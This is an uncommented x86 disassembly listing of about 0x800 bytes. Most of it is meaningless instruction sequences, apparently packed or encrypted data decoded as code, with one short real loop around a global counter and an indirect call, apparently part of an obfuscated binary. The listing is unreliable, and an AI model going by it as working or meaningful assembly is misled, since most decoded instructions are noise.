  415f93:	mov    edi,0x29e4b50
  415f98:	sub    ch,BYTE PTR [edx]
  415f9a:	xor    DWORD PTR [ecx+0x522f759b],0x5b9d073b
  415fa4:	leave  
  415fa5:	fsubr  QWORD PTR [ebp+0x689c4e59]
  415fab:	pop    ss
  415fac:	sahf   
  415fad:	jg     0x415f89
  415faf:	sbb    dl,dh
  415fb1:	mov    al,ds:0x9b31494f
  415fb6:	xlat   BYTE PTR ds:[ebx]
  415fb7:	xchg   ecx,eax
  415fb8:	or     al,0x62
  415fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fbb:	out    dx,eax
  415fbc:	ins    DWORD PTR es:[edi],dx
  415fbd:	jne    0x416025
  415fbf:	sub    eax,0xc0dc72a0
  415fc4:	data16 mov cl,0x43
  415fc7:	stos   BYTE PTR es:[edi],al
  415fc8:	jo     0x415f9f
  415fca:	inc    ebp
  415fcb:	mov    DWORD PTR [edi],0x8bcd514
  415fd1:	push   ebx
  415fd2:	push   ebx
  415fd3:	jmp    0x7544:0x87393856
  415fda:	xchg   esi,eax
  415fdb:	mov    ecx,0xce916a11
  415fe0:	call   0xe937a882
  415fe5:	das    
  415fe6:	fiadd  DWORD PTR [edx-0x23]
  415fe9:	mov    bl,0x53
  415feb:	imul   DWORD PTR [eax+0x34]
  415fee:	cmp    eax,0x96562f3a
  415ff3:	xor    BYTE PTR [edx+edx*8+0x1f1d5acf],cl
  415ffa:	arpl   WORD PTR [edi],sp
  415ffc:	xor    al,0x22
  415ffe:	addr16 mov al,0xd5
  416001:	mov    esp,esi
  416003:	mov    eax,0x57f0ff9f
  416008:	cli    
  416009:	jp     0x416057
  41600b:	and    DWORD PTR [edi+0x45],edi
  41600e:	cmp    ah,al
  416010:	clc    
  416011:	popa   
  416012:	(bad)  
  416013:	fidiv  WORD PTR [ecx-0x4c]
  416016:	test   BYTE PTR [eax],dl
  416018:	pop    edi
  416019:	icebp  
  41601a:	push   ebp
  41601b:	mov    WORD PTR [ebx],ds
  41601d:	xor    DWORD PTR [esi],edx
  41601f:	rcr    DWORD PTR [edi],0xde
  416022:	xor    ecx,edx
  416024:	bound  eax,QWORD PTR [ecx-0x84ed319]
  41602a:	pop    ebx
  41602b:	jb     0x415fe1
  41602d:	mov    eax,ds:0x1dda30f7
  416032:	pop    eax
  416033:	ret    0x98a7
  416036:	cmp    ecx,DWORD PTR [edx-0x76b79912]
  41603c:	ret    0x7337
  41603f:	pop    es
  416040:	je     0x41607d
  416042:	pop    eax
  416043:	pushf  
  416044:	inc    ecx
  416045:	pop    eax
  416046:	addr16 push esp
  416048:	pop    es
  416049:	add    DWORD PTR [edi-0x50],eax
  41604c:	aam    0x85
  41604e:	loop   0x41608f
  416050:	(bad)  
  416051:	sbb    al,0x21
  416053:	push   cs
  416054:	add    eax,0x2b6f0aa
  416059:	sbb    al,0xf3
  41605b:	mov    esp,0x2ec8a906
  416060:	(bad)  
  416061:	out    dx,eax
  416062:	sbb    al,0x94
  416064:	aad    0x58
  416066:	xor    eax,0x9f0d34ee
  41606b:	popf   
  41606c:	mov    DWORD PTR [edi-0x73],edx
  41606f:	inc    esp
  416070:	xor    BYTE PTR [ecx-0x6c899e46],0x95
  416077:	(bad)  [ebx]
  416079:	jp     0x416071
  41607b:	je     0x416086
  41607d:	repz pop ebx
  41607f:	xchg   ebp,eax
  416080:	cmc    
  416081:	xor    bh,cl
  416083:	int    0x3b
  416085:	mov    bh,0x6e
  416087:	pop    edx
  416088:	jae    0x41607f
  41608a:	dec    esi
  41608b:	fisub  WORD PTR [ecx]
  41608d:	xor    ebx,0xffffffa8
  416090:	fdivp  st(7),st
  416092:	icebp  
  416093:	add    ch,BYTE PTR [edi-0x2c]
  416096:	mov    bh,0xd0
  416098:	(bad)  
  416099:	outs   dx,DWORD PTR ds:[esi]
  41609a:	pop    eax
  41609b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41609c:	out    0x9e,eax
  41609e:	inc    edx
  41609f:	cwde   
  4160a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160a1:	loop   0x416031
  4160a3:	sar    DWORD PTR [ecx],0x5a
  4160a6:	ficom  DWORD PTR ds:0x4f5dcfc4
  4160ac:	mov    dh,0xcd
  4160ae:	ret    0x1068
  4160b1:	ds add al,0x9c
  4160b4:	mov    ch,0x61
  4160b6:	leave  
  4160b7:	sbb    al,0xf3
  4160b9:	pusha  
  4160ba:	push   eax
  4160bb:	(bad)  
  4160bc:	push   0xe92e714a
  4160c1:	daa    
  4160c2:	test   eax,0x91021b0
  4160c7:	dec    eax
  4160c8:	enter  0xbe57,0x2c
  4160cc:	(bad)
  4160cf:	arpl   WORD PTR [edi+0xa3d3e57],di
  4160d5:	sub    edx,edx
  4160d7:	lods   al,BYTE PTR ds:[esi]
  4160d8:	mov    cl,0xee
  4160da:	ret    
  4160db:	sub    DWORD PTR [ebx+eax*1+0x16],edx
  4160df:	icebp  
  4160e0:	lock sub esp,edi
  4160e3:	outs   dx,BYTE PTR ds:[esi]
  4160e4:	mov    esi,0x1e54ba27
  4160e9:	scas   al,BYTE PTR es:[edi]
  4160ea:	mov    ebp,0x397c6bf0
  4160ef:	jbe    0x4160c3
  4160f1:	das    
  4160f2:	pushf  
  4160f3:	pushf  
  4160f4:	das    
  4160f5:	mov    ah,dl
  4160f7:	push   edi
  4160f8:	lods   eax,DWORD PTR ds:[esi]
  4160f9:	loopne 0x416177
  4160fb:	(bad)  
  4160fc:	idiv   BYTE PTR [ecx+eiz*4]
  4160ff:	or     edx,edi
  416101:	jmp    0x416149
  416103:	js     0x416108
  416105:	push   0xe48916d8
  41610a:	test   BYTE PTR [ecx-0x54],ah
  41610d:	mov    esi,?
  41610f:	xor    al,0xd7
  416111:	jl     0x4160f8
  416113:	and    ah,BYTE PTR [ebp-0x2727e4d2]
  416119:	loop   0x416125
  41611b:	pushf  
  41611c:	push   0x1b
  41611e:	mov    dl,0xa5
  416120:	dec    ecx
  416121:	nop
  416122:	mov    al,ds:0x56f54439
  416127:	stc    
  416128:	ss pop eax
  41612a:	mov    edi,0x9e2b9971
  41612f:	xchg   esp,eax
  416130:	push   cs
  416131:	adc    ebp,DWORD PTR [ecx-0x53]
  416134:	or     ecx,ebp
  416136:	test   BYTE PTR [edx-0x45],ch
  416139:	jg     0x41614b
  41613b:	push   0x9fd18c89
  416140:	or     dl,bl
  416142:	fimul  WORD PTR cs:[ecx]
  416145:	and    dl,BYTE PTR [edx+0x1511764b]
  41614b:	xchg   ebp,eax
  41614c:	int    0xee
  41614e:	mov    esi,0x8a408a93
  416153:	fistp  QWORD PTR [ecx]
  416155:	xchg   ebx,eax
  416156:	cmp    BYTE PTR [ecx+0xb],cl
  416159:	add    dl,BYTE PTR [ebp+0x3538026c]
  41615f:	jmp    0x416162
  416161:	push   eax
  416162:	xchg   esi,eax
  416163:	out    dx,al
  416164:	dec    ecx
  416165:	arpl   WORD PTR [edx],si
  416167:	call   0x9875:0x66ef3092
  41616e:	test   ah,0x6
  416171:	mov    ah,0xdd
  416174:	imul   esp,DWORD PTR [edi+0x4fa62703],0x78
  41617b:	repnz fsub QWORD PTR [edx]
  41617e:	call   0x570a:0xd2e55ba7
  416185:	or     DWORD PTR [edi-0x8],edx
  416188:	(bad)  
  416189:	push   ebx
  41618a:	out    dx,al
  41618b:	call   0x18f726e0
  416190:	xlat   BYTE PTR ds:[ebx]
  416191:	and    al,0xf9
  416193:	iret   
  416194:	cmp    al,0x7c
  416196:	aas    
  416197:	das    
  416198:	xor    BYTE PTR gs:[edi+0x61eb3abb],bl
  41619f:	mov    ds:0x7b2998c0,al
  4161a4:	(bad)
  4161a8:	cs pushf 
  4161aa:	xor    eax,0x2c31d84d
  4161af:	add    cl,BYTE PTR [ebx]
  4161b1:	and    ebx,DWORD PTR [ebx+0x40a1276]
  4161b7:	pop    ecx
  4161b8:	jnp    0x416143
  4161ba:	ss pop ecx
  4161bc:	xchg   esi,eax
  4161bd:	jmp    0x8bb34383
  4161c2:	mov    dh,BYTE PTR [ebp-0x1d7dd949]
  4161c8:	pop    edx
  4161c9:	int    0xe7
  4161cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161cc:	sbb    eax,0xfafadd19
  4161d1:	cmp    eax,0x508b97dc
  4161d6:	imul   edx,ebx,0x25
  4161d9:	(bad)  
  4161da:	in     eax,0xb
  4161dc:	sbb    BYTE PTR [edi],bl
  4161de:	inc    edx
  4161df:	repz ss jo 0x41625b
  4161e3:	rcl    BYTE PTR [esi-0x1572373c],cl
  4161e9:	mov    bl,0x5b
  4161eb:	push   eax
  4161ec:	jmp    DWORD PTR ds:0x8b81761a
  4161f2:	inc    ebp
  4161f3:	cld    
  4161f4:	mov    DWORD PTR ds:0x42b00d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42b00d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42b00d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42b00d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42b00d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42b00d,edx
  416249:	mov    edx,DWORD PTR ds:0x42b00d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42b00d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42aee9,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42afc1,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x53a20246]
  416290:	add    al,0xbc
  416292:	sbb    BYTE PTR [edi+0x78],bh
  416295:	xchg   ebp,eax
  416296:	jle    0x416310
  416298:	js     0x4162e2
  41629a:	pop    ds
  41629b:	sbb    edx,DWORD PTR [ebx]
  41629d:	or     al,al
  41629f:	shr    BYTE PTR [ecx-0x2d57e13a],1
  4162a5:	(bad)
  4162a8:	push   ss
  4162a9:	ja     0x41626e
  4162ab:	pop    cx
  4162ad:	inc    ebx
  4162ae:	leave  
  4162af:	inc    eax
  4162b0:	mov    al,ds:0x975a6fa1
  4162b5:	jg     0x416261
  4162b7:	jp     0x41632b
  4162b9:	jmp    0x4162f6
  4162bb:	hlt    
  4162bc:	or     DWORD PTR [ecx-0x63],eax
  4162bf:	jp     0x4162d7
  4162c1:	in     al,dx
  4162c2:	push   ss
  4162c3:	fwait
  4162c4:	pop    edx
  4162c5:	mov    bh,0x94
  4162c7:	xor    eax,0xf4e7f82a
  4162cc:	jp     0x4162b1
  4162ce:	cmc    
  4162cf:	or     eax,0xe67675eb
  4162d4:	aad    0x8f
  4162d6:	scas   al,BYTE PTR es:[edi]
  4162d7:	mov    WORD PTR [edi-0x495c2ee],?
  4162dd:	pusha  
  4162de:	imul   edx,DWORD PTR [ecx],0x54
  4162e1:	mov    bl,0xb1
  4162e3:	(bad)  
  4162e4:	xchg   esp,eax
  4162e5:	or     edi,esp
  4162e7:	mov    ?,WORD PTR [eax-0x7a56e295]
  4162ed:	pop    edx
  4162ee:	std    
  4162ef:	sbb    al,BYTE PTR [eax-0x399bbe06]
  4162f5:	xchg   esi,eax
  4162f6:	add    al,0xbb
  4162f8:	loope  0x4162b4
  4162fa:	ffree  st(5)
  4162fc:	sub    BYTE PTR [ebp+0x1e55851d],ch
  416302:	cs xchg ebp,eax
  416304:	push   0xfffffff9
  416306:	arpl   WORD PTR [esi+0x5e85115],cx
  41630c:	mov    BYTE PTR [edx+0x45],dl
  41630f:	adc    ch,dh
  416311:	xor    al,ch
  416313:	xchg   ebp,eax
  416314:	ret    0xdef1
  416317:	bound  eax,QWORD PTR [ebp-0x2cec1c0d]
  41631d:	fmul   DWORD PTR [edi+eax*2-0x600f1acd]
  416324:	xchg   ecx,eax
  416325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416326:	push   ebx
  416327:	jl     0x4162ee
  416329:	or     bh,cl
  41632b:	ss popa 
  41632d:	je     0x416343
  41632f:	add    eax,0x7bc98e8
  416334:	fnstenv [ecx]
  416336:	cld    
  416337:	xor    al,0xa4
  416339:	mov    al,ds:0x2be07ef0
  41633e:	jp     0x41638a
  416340:	pusha  
  416341:	lds    edx,FWORD PTR [eax+ebx*2+0x27]
  416345:	pop    esi
  416346:	fwait
  416347:	push   edx
  416348:	xchg   DWORD PTR [edi-0xe6d2d93],esp
  41634e:	je     0x416312
  416350:	aas    
  416351:	pop    ecx
  416352:	push   es
  416353:	(bad)  
  416355:	fst    DWORD PTR ds:0x6cfaf738
  41635b:	dec    edx
  41635c:	sbb    BYTE PTR ds:0x6c965a47,bl
  416362:	lds    esp,FWORD PTR [edx+0x6c840636]
  416368:	pusha  
  416369:	adc    edx,edi
  41636b:	cli    
  41636c:	dec    ecx
  41636d:	xchg   edi,eax
  41636e:	or     esp,0xffffffa1
  416371:	mov    cl,0xdd
  416373:	xchg   BYTE PTR [ecx+ecx*4+0x6d],al
  416377:	xchg   ecx,eax
  416378:	jp     0x4163f6
  41637a:	sti    
  41637b:	pop    ss
  41637c:	lock or ecx,DWORD PTR [ebp+ecx*2+0xa]
  416381:	xchg   edi,eax
  416382:	shl    BYTE PTR [edi-0x41],cl
  416385:	lock add dh,ah
  416388:	pop    esi
  416389:	imul   edi,DWORD PTR [ebx+0x22be102e],0x33
  416390:	mov    ah,dl
  416392:	(bad)  
  416393:	or     BYTE PTR [eax+eax*8-0x2cccc70a],ah
  41639a:	pop    ss
  41639b:	inc    edx
  41639c:	push   eax
  41639d:	or     al,0x8e
  41639f:	aam    0x22
  4163a1:	or     bl,BYTE PTR [edi+ecx*1]
  4163a4:	xor    esp,DWORD PTR [esi+esi*1]
  4163a7:	fistp  DWORD PTR [ebx+0x7b]
  4163aa:	sbb    cl,dl
  4163ac:	cmp    BYTE PTR [esi],bh
  4163ae:	mov    esi,DWORD PTR [ebp+ebp*1-0x580fc835]
  4163b5:	fwait
  4163b6:	loopne 0x416361
  4163b8:	fistp  WORD PTR [esi-0x26]
  4163bb:	sbb    al,0xca
  4163bd:	add    BYTE PTR [esi-0x38ad34b3],ah
  4163c3:	loope  0x416360
  4163c5:	lods   eax,DWORD PTR ds:[esi]
  4163c6:	adc    al,0xf1
  4163c8:	adc    esi,DWORD PTR ds:0xb9ec778d
  4163ce:	and    eax,0x9771c22
  4163d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163d4:	sub    ebx,DWORD PTR [ecx-0x3a]
  4163d7:	xor    BYTE PTR [ecx-0x309acbfe],0x5c
  4163de:	sub    bl,BYTE PTR [edi-0xb]
  4163e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163e2:	jo     0x41636e
  4163e4:	out    0x76,eax
  4163e6:	loopne 0x41644b
  4163e8:	push   ds
  4163e9:	lock dec esi
  4163eb:	test   ch,bh
  4163ed:	sbb    bl,BYTE PTR [ecx+0x8599cc8]
  4163f3:	add    DWORD PTR [ebp-0x1],esp
  4163f6:	pop    eax
  4163f7:	pusha  
  4163f8:	repz or al,0x8c
  4163fb:	js     0x416476
  4163fd:	cdq    
  4163fe:	push   cs
  4163ff:	rol    DWORD PTR [edx],0xfa
  416402:	adc    cl,BYTE PTR [esi]
  416404:	sbb    edx,DWORD PTR [edi]
  416406:	and    BYTE PTR [edx+ebx*4-0x20],0x25
  41640b:	pop    ebp
  41640c:	mov    cl,0x2d
  41640e:	cmp    al,0x31
  416410:	add    DWORD PTR [edi+0x41d17b4d],eax
  416416:	sti    
  416417:	pop    esi
  416418:	jno    0x4163fc
  41641a:	or     DWORD PTR [edi],ecx
  41641c:	adc    BYTE PTR [ecx-0x3de32296],ch
  416422:	pushf  
  416423:	push   esp
  416424:	sbb    dl,bl
  416426:	(bad)  
  416427:	fwait
  416428:	dec    ecx
  416429:	fiadd  WORD PTR [ebx+edi*4+0xc]
  41642d:	stos   DWORD PTR es:[edi],eax
  41642e:	mov    ds:0xd8bef20d,al
  416433:	pop    esp
  416434:	mov    cl,0x23
  416436:	mov    ss,ebp
  416438:	jns    0x4163dc
  41643a:	dec    ch
  41643c:	test   eax,0x3c6f1440
  416441:	adc    esp,DWORD PTR cs:[ebx+0x31]
  416445:	sub    eax,0x3ecca689
  41644a:	repz sti 
  41644c:	fist   DWORD PTR [ecx-0x23]
  41644f:	adc    bh,BYTE PTR [ebx]
  416451:	adc    eax,0xacbf916e
  416456:	push   ecx
  416457:	xchg   edx,eax
  416458:	mov    edi,0x4350edc6
  41645d:	xchg   esp,eax
  41645e:	popf   
  41645f:	adc    DWORD PTR [esi-0x18458638],esp
  416465:	cmp    eax,0x6f512574
  41646a:	out    0xe,eax
  41646c:	sbb    ebp,DWORD PTR [edx*1+0x7872b714]
  416473:	sub    ch,BYTE PTR [edx+0x15ce446f]
  416479:	and    edi,ecx
  41647b:	sbb    ecx,DWORD PTR [ebx-0x2236c2b4]
  416481:	fnsave [ecx+0x1]
  416484:	mov    edx,0x601c93da
  416489:	cmp    ebp,edi
  41648b:	enter  0xf1ac,0x4
  41648f:	xchg   DWORD PTR [esi+eiz*1-0x387f559e],esp
  416496:	add    eax,0x2397d154
  41649b:	push   ebp
  41649c:	rol    DWORD PTR [edx],1
  41649e:	or     al,0xbc
  4164a0:	cmp    eax,0xaa721838
  4164a5:	xchg   ebx,eax
  4164a6:	xor    bh,BYTE PTR ds:0x495b8b74
  4164ac:	into   
  4164ad:	lahf   
  4164ae:	xchg   esp,eax
  4164af:	aas    
  4164b0:	cld    
  4164b1:	mov    WORD PTR [edx],?
  4164b3:	add    esi,ecx
  4164b5:	adc    dh,ah
  4164b7:	sbb    dl,BYTE PTR [edx+0x5a]
  4164ba:	mov    ?,WORD PTR [ecx-0x6e]
  4164bd:	adc    ecx,DWORD PTR [edx+0x7f2bb5b1]
  4164c3:	jb     0x41644d
  4164c5:	addr16 mov al,ds:0xfd53
  4164c9:	cmp    DWORD PTR [esi+0x55],ebx
  4164cc:	std    
  4164cd:	xor    BYTE PTR [eax+edi*4+0x28],dl
  4164d1:	ror    BYTE PTR [ebx],1
  4164d3:	test   eax,0x359a965
  4164d8:	add    cl,ah
  4164da:	xor    al,0xd7
  4164dc:	in     eax,0x18
  4164de:	pop    ecx
  4164df:	rcl    DWORD PTR [eax],cl
  4164e1:	dec    ebp
  4164e2:	inc    eax
  4164e3:	xor    bl,dh
  4164e5:	jo     0x4164cf
  4164e7:	sbb    eax,0xa35d6ed1
  4164ec:	subps  xmm5,xmm5
  4164ef:	(bad)  
  4164f0:	pop    ds
  4164f1:	pop    edx
  4164f2:	pop    ebp
  4164f3:	dec    eax
  4164f4:	fdivr  DWORD PTR [ebp+0x75]
  4164f7:	cli    
  4164f8:	test   DWORD PTR [ecx-0xc],edi
  4164fb:	sti    
  4164fc:	popa   
  4164fd:	jo     0x4164e4
  4164ff:	xlat   BYTE PTR ds:[ebx]
  416500:	or     ecx,DWORD PTR [ebx-0x3e89c379]
  416506:	mov    ch,0x20
  416508:	sub    DWORD PTR [ecx],0x5e
  41650b:	or     bh,0xab
  41650e:	xor    al,0x76
  416510:	test   ecx,edi
  416512:	mov    bh,dl
  416514:	jne    0x416581
  416516:	jl     0x41652e
  416518:	jp     0x416538
  41651a:	lods   eax,DWORD PTR ds:[esi]
  41651b:	lds    eax,FWORD PTR [ebx-0x2a]
  41651e:	mov    ds:0x271d8e18,al
  416523:	mov    edx,0xa8dc6f5b
  416528:	les    ecx,FWORD PTR [edx]
  41652a:	jle    0x4164f3
  41652c:	fsub   st,st(6)
  41652e:	add    ah,BYTE PTR [esi+ebx*2-0x17ab3951]
  416535:	xor    bl,BYTE PTR [eax]
  416537:	add    BYTE PTR [eax],al
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0x4f1c839a],cl
  416557:	mov    ebx,0x1dd93aa2
  41655c:	jg     0x4165d6
  41655e:	xchg   ebp,eax
  41655f:	jle    0x4165d9
  416561:	js     0x4165bf
  416563:	push   0x22758432
  416568:	or     DWORD PTR [ecx-0x7a4dd205],eax
  41656e:	ja     0x41658b
  416570:	lods   eax,DWORD PTR ds:[esi]
  416571:	das    
  416572:	in     eax,0x7
  416574:	inc    esp
  416575:	jl     0x4165a1
  416577:	sub    al,0x50
  416579:	sub    al,0x33
  41657b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41657c:	and    BYTE PTR [ecx+0x796c109d],ah
  416582:	cmc    
  416583:	jecxz  0x4165ca
  416585:	add    esp,DWORD PTR [eax+ecx*8]
  416588:	scas   al,BYTE PTR es:[edi]
  416589:	cmovnp ebp,DWORD PTR [esi]
  41658c:	jmp    esp
  41658e:	mov    ebx,0xfa9cc6d5
  416593:	cmp    eax,0x8c46067f
  416598:	icebp  
  416599:	jns    0x4165e4
  41659b:	aad    0xcc
  41659d:	xor    eax,0xe2bd020b
  4165a2:	mov    bl,0xef
  4165a4:	ret    0xa4c6
  4165a7:	icebp  
  4165a8:	push   ds
  4165a9:	inc    ecx
  4165aa:	xchg   esp,eax
  4165ab:	mov    WORD PTR [ebp-0x5af1d9a8],ds
  4165b1:	sub    eax,0xa5c970e7
  4165b6:	and    cl,BYTE PTR [ecx+0x1261deb4]
  4165bc:	loop   0x41656d
  4165be:	orps   xmm4,XMMWORD PTR [ebp+0x33]
  4165c2:	inc    edx
  4165c3:	sbb    al,0x4b
  4165c5:	cmp    eax,0x2f59bf12
  4165ca:	xlat   BYTE PTR ds:[ebx]
  4165cb:	inc    eax
  4165cc:	sub    BYTE PTR [ebp-0x58],al
  4165cf:	cmp    BYTE PTR [ebx],0x48
  4165d2:	xor    dh,BYTE PTR [esi-0x110327c8]
  4165d8:	loope  0x4165ec
  4165da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165db:	xchg   edx,eax
  4165dc:	stc    
  4165dd:	lahf   
  4165de:	jb     0x416606
  4165e0:	mov    WORD PTR [eax-0x4],gs
  4165e3:	xchg   ebp,eax
  4165e4:	push   ss
  4165e5:	or     DWORD PTR [ebx],0x3fd38594
  4165eb:	popa   
  4165ec:	pop    esp
  4165ed:	jl     0x416621
  4165ef:	fild   QWORD PTR [eax+0x6cc54495]
  4165f5:	xor    esp,ebp
  4165f7:	bound  esi,QWORD PTR [ebp+0x18]
  4165fa:	jecxz  0x4165b8
  4165fc:	fcmovu st,st(2)
  4165fe:	xchg   edi,eax
  4165ff:	jmp    0x9fbc:0x566f5e24
  416606:	push   ecx
  416607:	out    dx,al
  416608:	fisttp DWORD PTR [edx-0x1755a299]
  41660e:	ret    0x4ac
  416611:	cmp    eax,0xc8699b57
  416616:	in     al,dx
  416617:	pop    esp
  416618:	mov    DWORD PTR [ebx+edi*1+0x5f],edx
  41661c:	xor    BYTE PTR [edi-0x2c],ah
  41661f:	xchg   edi,ecx
  416621:	inc    ecx
  416622:	aad    0x40
  416624:	xchg   DWORD PTR [ebx],ebx
  416626:	jmp    0x991bb94e
  41662b:	jge    0x416615
  41662d:	mov    al,ds:0x59578aa
  416632:	mov    ebp,0x806bd168
  416637:	xlat   BYTE PTR ds:[ebx]
  416638:	and    al,0xdd
  41663a:	push   ds
  41663b:	fbstp  TBYTE PTR [eax+edi*4+0x590a09da]
  416642:	cmp    cl,bh
  416644:	mov    edi,0x786a00ef
  416649:	add    ecx,DWORD PTR [esi-0x7c]
  41664c:	pop    esi
  41664d:	jge    0x4165dd
  41664f:	cwde   
  416650:	ret    0xbbc
  416653:	mov    ebx,0xb97cfec9
  416658:	jb     0x416608
  41665a:	es jecxz 0x41667a
  41665d:	add    DWORD PTR [edi+ebp*4],0x1a851275
  416664:	iret   
  416665:	mov    edi,cs
  416667:	jnp    0x416636
  416669:	addr16 inc edx
  41666b:	xchg   ebp,eax
  41666c:	jl     0x416606
  41666e:	outs   dx,DWORD PTR ds:[esi]
  41666f:	push   cs
  416670:	inc    edx
  416671:	mov    dl,0xd7
  416673:	add    DWORD PTR [ecx+ebp*2-0x4f],0xffffffb1
  416678:	add    al,0x50
  41667a:	stos   BYTE PTR es:[edi],al
  41667b:	sub    eax,DWORD PTR [esp+eax*8+0x1a]
  41667f:	dec    ecx
  416680:	push   ecx
  416681:	push   edx
  416682:	sub    eax,0x6f01abec
  416687:	inc    ebp
  416688:	cmp    al,BYTE PTR [ebx-0x49]
  41668b:	in     al,0x55
  41668d:	aam    0x46
  41668f:	inc    ebx
  416690:	sbb    al,0xc8
  416692:	xlat   BYTE PTR ds:[ebx]
  416693:	push   0x3a
  416695:	fld    DWORD PTR [ebx+ecx*8-0x44]
  416699:	inc    edi
  41669a:	inc    esi
  41669b:	pop    eax
  41669c:	jmp    FWORD PTR [ebx+ebx*4-0x4f51b45d]
  4166a3:	or     al,0x93
  4166a5:	xchg   ecx,eax
  4166a6:	jge    0x416695
  4166a8:	push   edi
  4166a9:	pop    ebp
  4166aa:	dec    edx
  4166ab:	aam    0x83
  4166ad:	out    dx,al
  4166ae:	shl    DWORD PTR [eax+ebx*2+0x62bc9ac3],0xd9
  4166b6:	(bad)  
  4166b7:	fisubr WORD PTR [ebx-0x51]
  4166ba:	loope  0x41666c
  4166bc:	push   edi
  4166bd:	xchg   ebx,eax
  4166be:	mov    DWORD PTR [ebp+0x71e3c63],ebx
  4166c4:	or     bl,BYTE PTR [ecx+0x63cb98f9]
  4166ca:	push   eax
  4166cb:	stos   DWORD PTR es:[edi],eax
  4166cc:	ficomp WORD PTR [edx+0x5092d68]
  4166d2:	xchg   ebp,eax
  4166d3:	mov    DWORD PTR [edx-0x21],ebp
  4166d6:	sbb    BYTE PTR [esi],0xf5
  4166d9:	je     0x4166d2
  4166db:	leave  
  4166dc:	je     0x4166eb
  4166de:	std    
  4166df:	dec    esi
  4166e0:	std    
  4166e1:	mov    ecx,0xce665d93
  4166e6:	sub    esp,DWORD PTR [ecx+0x2d01d839]
  4166ec:	std    
  4166ed:	jns    0x416730
  4166ef:	jo     0x416724
  4166f1:	mov    ds,WORD PTR [ecx]
  4166f3:	dec    esp
  4166f4:	xor    ah,BYTE PTR [edx+ecx*8+0x62]
  4166f8:	pop    ss
  4166f9:	mov    esp,0x5e14b26f
  4166fe:	jmp    0xd3de4a0f
  416703:	mov    bh,0x42
  416705:	scas   al,BYTE PTR es:[edi]
  416706:	cwde   
  416707:	shl    BYTE PTR [eax+0x59],cl
  41670a:	push   0xa955541a
  41670f:	inc    ecx
  416710:	int3   
  416711:	jmp    0xd870:0xa2879d6a
  416718:	hlt    
  416719:	loop   0x4166aa
  41671b:	mov    ah,al
  41671d:	mov    ch,0x68
  416720:	retf   0x2004
  416723:	fs cmp edx,esp
  416726:	test   BYTE PTR [eax+0x2e],cl
  416729:	xchg   esi,eax
  41672a:	imul   ecx,DWORD PTR [ebx+0x37],0x29
  41672e:	xchg   ebp,ebp
  416730:	out    0x82,eax
  416732:	in     al,0x32
  416734:	jle    0x4166ef
  416736:	mov    fs,WORD PTR [esp+eax*2]
  416739:	add    esi,DWORD PTR [esi+ecx*4+0x5a]
  41673d:	push   edx
  41673e:	or     ch,bl
  416740:	pop    ebp
  416741:	lods   al,BYTE PTR ds:[esi]
  416742:	test   DWORD PTR [eax],eax
  416744:	xor    cl,dh
  416746:	cdq    
  416747:	fistp  WORD PTR [edx]
  416749:	sub    esi,DWORD PTR ds:0x924f8afb
  41674f:	aam    0x85
  416751:	sub    ah,BYTE PTR es:[edi+edi*2]
  416755:	(bad)  
  416756:	push   es
  416757:	repnz loop 0x4167d1
  41675a:	adc    dh,ah
  41675c:	pop    ecx
  41675d:	sahf   
  41675e:	dec    ebx
  41675f:	sti    
  416760:	(bad)  
  416761:	das    
  416762:	(bad)  
  416763:	adc    BYTE PTR [ebp-0x5e],ah
  416766:	mov    eax,cs
  416768:	clc    
  416769:	sbb    bl,BYTE PTR [ebx+0xa]
  41676c:	std    
  41676d:	xor    dl,dh
  41676f:	xchg   edx,eax
  416770:	popf   
  416771:	sub    al,0xac
  416773:	test   DWORD PTR [edi+esi*8],eax
  416776:	sub    eax,0xdf1c35
  41677b:	int    0xf0
  41677d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41677f:	sbb    bl,dh
  416781:	sti    
  416782:	lea    ecx,[esi+0x79]
  416785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416786:	in     al,dx
  416787:	sbb    DWORD PTR [eax],esp
  416789:	xchg   esi,eax
  41678a:	sbb    eax,0x2c953a9
  41678f:	sbb    DWORD PTR [ecx-0x72],ecx
  416792:	icebp  
  416793:	adc    DWORD PTR [esi+0x45],edx
  416796:	call   0x424c4da
  41679b:	mov    eax,ds:0xfaca257e
  4167a0:	lahf   
  4167a1:	aad    0xe
  4167a3:	sbb    ch,BYTE PTR [esi]
  4167a5:	pop    eax
  4167a6:	mov    eax,ds:0x46a1be0a
  4167ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
